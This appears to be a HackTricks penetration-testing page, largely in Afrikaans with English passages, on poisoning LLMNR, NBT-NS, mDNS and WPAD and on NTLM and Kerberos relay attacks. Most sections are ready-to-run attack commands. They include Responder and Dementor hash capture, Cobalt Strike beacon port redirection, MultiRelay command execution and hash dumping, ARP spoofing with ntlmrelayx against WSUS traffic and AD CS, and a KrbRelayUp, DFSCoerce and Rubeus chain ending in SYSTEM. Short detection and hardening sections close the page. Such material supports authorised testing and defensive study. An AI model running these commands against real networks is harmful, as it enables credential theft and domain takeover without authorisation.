# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Netwerkprotokolle

### Plaaslike gasheer-oplossingsprotokolle

- **LLMNR, NBT-NS en mDNS**:
- Microsoft en ander bedryfstelsels gebruik LLMNR en NBT-NS vir plaaslike naamoplossing wanneer DNS misluk. Terselfdertyd gebruik Apple- en Linux-stelsels mDNS.
- Hierdie protokolle is vatbaar vir onderskep en spoofing weens hul ongemagtigde, uitsaai-gedrag oor UDP.
- Responder en Dementor kan gebruik word om dienste na te boots deur vervalste antwoorde te stuur aan gashere wat navrae oor hierdie protokolle doen.
- Meer inligting oor diensnamaak met Responder is beskikbaar [hier](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery-protokol (WPAD)

- WPAD laat blaaiers toe om proxy-instellings outomaties te ontdek.
- Ontdekking word gefasiliteer via DHCP, DNS, of terugspring na LLMNR en NBT-NS indien DNS misluk.
- Responder kan WPAD-aanvalle outomatiseer en kliënte na kwaadwillige WPAD-bedieners lei.

### Responder/Dementor vir protokolvergiftiging

- **Responder** is 'n hulpmiddel wat gebruik word om LLMNR-, NBT-NS- en mDNS-navrae te vergiftig, selektief te reageer gebaseer op navraagtipes, en primêr SMB-dienste te teiken.
- Dit kom vooraf geïnstalleer in Kali Linux, en is konfigureerbaar by /etc/responder/Responder.conf.
- Responder wys vasgevang hashes op die skerm en stoor dit in die /usr/share/responder/logs-gids.
- Dit ondersteun beide IPv4 en IPv6.
- Windows-weergawes van Responder is beskikbaar [hier](https://github.com/lgandx/Responder-Windows).

- **Dementor** brei die onderwerpe van multicast-vergiftiging uit en tree daarby op as 'n skelm diensverskaffer (insluitend CUPS RCE-ondersteuning)
- Die algemene struktuur is soortgelyk aan **Responder** met meer gedetailleerde konfigurasie. (standaard is hier: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Kompatibiliteit tussen **Dementor** en **Responder** word hier gegee: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Inleiding en dokumentasie: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Los vasleggingsprobleme op wat deur Responder op sekere protokolle veroorsaak is

#### Responder uitvoer

- Om Responder met standaardinstellings uit te voer: `responder -I <Interface>`
- Vir meer aggressiewe ondersoek (met moontlike newe-effekte): `responder -I <Interface> -P -r -v`
- Tegnieke om NTLMv1 uitdagings/antwoorde vas te vang vir makliker kraking: `responder -I <Interface> --lm --disable-ess`
- WPAD-imitasie kan geaktiveer word met: `responder -I <Interface> --wpad`
- NetBIOS-versoeke kan na die aanvaller se IP opgelos word, en 'n verifikasie-proxy kan opgestel word: `responder.py -I <interface> -Pv`

#### Dementor uitvoer

- Met standaardinstellings: `Dementor -I <interface>`
- Met standaardinstellings in analise-modus: `Dementor -I <interface> -A`
- Outomatiese NTLM-sessie-afgradering (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Voer huidige sessie uit met pasgemaakte konfigurasie: `Dementor -I <interface> --config <file.toml>`

### DHCP-vergiftiging met Responder

- Spoofing van DHCP-antwoorde kan permanent 'n slagoffer se roeteringsinligting vergiftig, en bied 'n meer heimlike alternatief vir ARP-vergiftiging.
- Dit vereis presiese kennis van die teiken-netwerk se konfigurasie.
- Om die aanval uit te voer: `./Responder.py -I eth0 -Pdv`
- Hierdie metode kan effektief NTLMv1/2-hashes vasvang, maar dit vereis sorgvuldige hantering om netwerkversteuring te vermy.

### Kredensiaalvaslegging met Responder/Dementor

- Responder/Dementor sal dienste namaak deur die bogenoemde protokolle te gebruik, en kredensiale vasvang (gewoonlik NTLMv2 Challenge/Response) wanneer 'n gebruiker probeer verifieer teen die gespoofde dienste.
- Pogings kan aangewend word om af te gradeer na NetNTLMv1 of ESS uit te skakel vir makliker kraking van kredensiale.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Dit is belangrik om daarop te let dat die gebruik van hierdie tegnieke wettig en eties moet geskied, met behoorlike magtiging en om ontwrigting of ongemagtigde toegang te vermy.

## Inveigh

Inveigh is 'n tool vir penetration testers en red teamers, ontwerp vir Windows-stelsels. Dit bied funksionaliteite soortgelyk aan Responder, en voer spoofing en man-in-the-middle-aanvalle uit. Die tool het ontwikkel van 'n PowerShell-skrip na 'n C#-binaire, met [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) en [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) as die hoofweergawes. Gedetailleerde parameters en instruksies kan in die [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) gevind word.

Inveigh kan deur PowerShell bedryf word:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Of uitgevoer as 'n C#-binary:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Hierdie aanval maak gebruik van SMB-authentikasiesessies om toegang tot ’n teikenmasjien te kry, en gee ’n system shell as dit suksesvol is. Sleutelvoorvereistes sluit in:

- Die gebruiker wat autentiseer moet Local Admin-toegang hê op die relayed host.
- SMB signing moet gedeaktiveer wees.

#### 445 Port Forwarding and Tunneling

In scenario's waar direkte netwerktoegang nie uitvoerbaar is nie, moet verkeer op port 445 doorgestuur en deurgetunnel word. Gereedskap soos [**PortBender**](https://github.com/praetorian-inc/PortBender) help om verkeer op port 445 na ’n ander poort om te lei, wat noodsaaklik is wanneer Local Admin-toegang beskikbaar is vir driver loading.

PortBender-opstelling en werking in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Ander gereedskap vir NTLM Relay Attack

- **Metasploit**: Opgestel met proxies, plaaslike en remote host-besonderhede.
- **smbrelayx**: 'n Python-skrip vir die relaying van SMB-sessies en die uitvoer van opdragte of die ontplooiing van backdoors.
- **MultiRelay**: 'n hulpmiddel uit die Responder-suite om spesifieke gebruikers of alle gebruikers te relê, opdragte uit te voer, of hashes te dump.

Elke hulpmiddel kan gekonfigureer word om deur 'n SOCKS proxy te werk indien nodig, wat aanvalle selfs met indirekte netwerktoegang moontlik maak.

### MultiRelay-operasie

MultiRelay word uitgevoer vanaf die _**/usr/share/responder/tools**_ gids, met teikens op spesifieke IPs of gebruikers.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
These tools and techniques form a comprehensive set for conducting NTLM Relay attacks in various network environments.

### Misbruik van WSUS HTTP (8530) vir NTLM Relay na LDAP/SMB/AD CS (ESC8)

WSUS clients authenticate to their update server using NTLM over HTTP (8530) or HTTPS (8531). When HTTP is enabled, periodic client check-ins can be coerced or intercepted on the local segment and relayed with ntlmrelayx to LDAP/LDAPS/SMB or AD CS HTTP endpoints (ESC8) without cracking any hashes. This blends into normal update traffic and frequently yields machine-account authentications (HOST$).

Wat om na te soek
- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Verkenning
- Sonder autentisering
- Skandeer vir luisteraars: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniffer HTTP WSUS-verkeer via L2 MITM en log aktiewe kliënte/endpunte met wsusniff.py (slegs HTTP tensy jy kliënte laat vertrou in jou TLS cert).
- Met autentisering
- Ontleed SYSVOL GPOs vir WSUS-sleutels met MANSPIDER + regpol (wsuspider.sh wrapper sommeer WUServer/WUStatusServer/UseWUServer).
- Query endpunte op skaal vanaf hosts (NetExec) of lokaal:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-tot-end HTTP relay-stappe
1) Positioneer vir MITM (dieselfde L2) sodat 'n kliënt die WSUS-server na jou oplos (ARP/DNS poisoning, Bettercap, mitm6, ens.). Voorbeeld met arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Herlei poort 8530 na jou relay-luisteraar (opsioneel, gerieflik):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Start ntlmrelayx met die HTTP-luisteraar (vereis Impacket support vir HTTP listener; sien PRs hieronder):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Andere algemene teikens:
- Relay na SMB (indien signing af is) vir exec/dump: -t smb://<host>
- Relay na LDAPS vir gidsveranderings (bv. RBCD): -t ldaps://<DC>
- Relay na AD CS web enrollment (ESC8) om 'n sertifikaat te mint en dan te autentiseer via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Lok 'n kliënt se check-in of wag vir die skedule. Vanaf 'n kliënt:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Gebruik die geauthentiseerde SOCKS-sessies (indien -socks) of direkte relay-resultate vir post-exploitation (LDAP-wysigings, SMB-aksies, of AD CS-sertifikaatuitreiking vir later autentisering).

HTTPS beperking (8531)
- Passiewe onderskep van WSUS oor HTTPS is ondoeltreffend tensy kliënte jou sertifikaat vertrou. Sonder 'n vertroude cert of ander TLS-breek, kan die NTLM-handshake nie uit WSUS HTTPS-verkeer geoes/gerelay word nie.

Aantekeninge
- WSUS is aangekondig as deprecated maar bly wyd gedeploy; HTTP (8530) is steeds algemeen in baie omgewings.
- Nuttige helpers: wsusniff.py (observeer HTTP WSUS check-ins), wsuspider.sh (enumereer WUServer/WUStatusServer vanaf GPOs), NetExec reg-query op skaal.
- Impacket het HTTP listener support vir ntlmrelayx herstel in PR #2034 (oorspronklik bygevoeg in PR #913).

### Dwing NTLM-aanmeldings

In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay-aanval

A **Kerberos relay attack** steel 'n **AP-REQ ticket** van een diens en hergebruik dit teen 'n tweede diens wat dieselfde **computer-account sleutel** deel (omdat beide SPNs op dieselfde `$` machine account sit). Dit werk selfs al verskil die SPN se **service classes** (bv. `CIFS/` → `LDAP/`) omdat die *sleutel* wat die ticket ontsleutel die masjien se NT-hash is, nie die SPN-string self nie, en die SPN-string is nie deel van die handtekening nie.

In teenstelling met NTLM relay, is die hop beperk tot dieselfde gas, maar as jy 'n protokol teiken wat jou toelaat om na LDAP te skryf, kan jy ketting in **Resource-Based Constrained Delegation (RBCD)** of **AD CS enrollment** en pop **NT AUTHORITY\SYSTEM** in een slag.

Vir gedetailleerde inligting oor hierdie aanval, sien:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basiese beginsels**

| Token | Doel | Relevansie vir relay |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Bewys die gebruiker aan die KDC | onveranderd |
| **Service ticket / TGS-REQ ↔ REP** | Gebonde aan een **SPN**; geïnkripteer met die SPN-eienaar se sleutel | inruilbaar as SPNs dieselfde account deel |
| **AP-REQ** | Kliënt stuur `TGS` na die diens | **wat ons steel & replay** |

* Tickets is geïnkripteer met die **wagwoord-afgeleide sleutel van die rekening wat die SPN besit**.
* Die **Authenticator** binne die AP-REQ het 'n 5-minuut tydstempel; replay binne daardie venster is geldig totdat die dienskas 'n duplikaat sien.
* Windows kontroleer selde of die SPN-string in die ticket ooreenstem met die diens wat jy tref, so 'n ticket vir `CIFS/HOST` ontsleutel normaalweg goed op `LDAP/HOST`.

- 2. **Wat moet waar wees om Kerberos te relay**

1. **Shared key:** bron- en teiken-SPNs behoort aan dieselfde computer-account (standaard op Windows-servers).
2. **No channel protection:** SMB/LDAP signing af en EPA af vir HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, ens..
4. **Ticket source not already used:** jy wen die wedloop voor die regte pakket tref of blokkeer dit heeltemal; andersins vuur die bediener se replay-cache Event 4649.
5. Jy moet op een of ander wyse 'n **MitM in die kommunikasie** kan uitvoer—byvoorbeeld deur deel te wees van die DNSAmins groep om die DNS van die domein te verander of deur die HOST-lêer van die slagoffer te verander.

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Begin die relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` verpak **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in een binêre.

- 3.3 **Forceer Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce laat die DC `CIFS/DC01` Kerberos ticket aan ons stuur.

- 3.4 **Herlei die AP-REQ**

KrbRelay haal die GSS blob uit SMB, pak dit in 'n LDAP bind in, en stuur dit na `ldap://DC01`—verifikasie slaag omdat die **dieselfde sleutel** dit ontsleutel.

- 3.5 **Misbruik LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Jy het nou **NT AUTHORITY\SYSTEM**.


### **Meer paaie wat dit werd is om te ken**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Valse server stuur ’n **GSS-ID payload** met enige SPN; kliënt bou ’n AP-REQ reg na jou toe | Werk selfs oor subnette; machine creds per verstek |
| **DCOM / MSRPC** | Kwaadaardige OXID resolver dwing kliënt om te authentiseer na ewekansige SPN en poort | Pure *lokale* priv-esc; omseil firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | Nie nodig om ’n rekenaarrekening by te voeg nie |

### **Probleemoplossing**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Kaartjie-sleutel ≠ teiken-sleutel | Verkeerde host/SPN |
| `KRB_AP_ERR_SKEW` | Klokafwyking > 5 min | Sinkroniseer tyd of gebruik `w32tm` |
| LDAP bind fails | Ondertekening afgedwing | Gebruik AD CS-paadjie of skakel ondertekening af |
| Event 4649 spam | Diens het duplikaat Authenticator gesien | Blokkeer of race oorspronklike pakket |


### **Opsporing**

* Styging in **Event 4769** vir `CIFS/`, `HTTP/`, `LDAP/` vanaf dieselfde bron binne sekondes.
* **Event 4649** op die diens dui op ’n herhaling.
* Kerberos-aanmelding vanaf **127.0.0.1** (relay na plaaslike SCM) is hoogs verdag—map dit via die Sigma-reël in KrbRelayUp-dokumentasie.
* Hou veranderinge aan `msDS-AllowedToActOnBehalfOfOtherIdentity` of `msDS-KeyCredentialLink` eienskappe dop.

## **Verharding**

1. **Handhaaf LDAP & SMB ondertekening + EPA** op elke bediener.
2. **Splits SPNs** sodat HTTP nie op dieselfde rekening as CIFS/LDAP is nie.
3. Maak dwangvektore reg (PetitPotam KB5005413, DFS, AuthIP).
4. Stel **`ms-DS-MachineAccountQuota = 0`** om ongewenste rekenaarinskrywings te voorkom.
5. Waarsku op **Event 4649** en onverwagte loopback Kerberos-aanmeldings.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
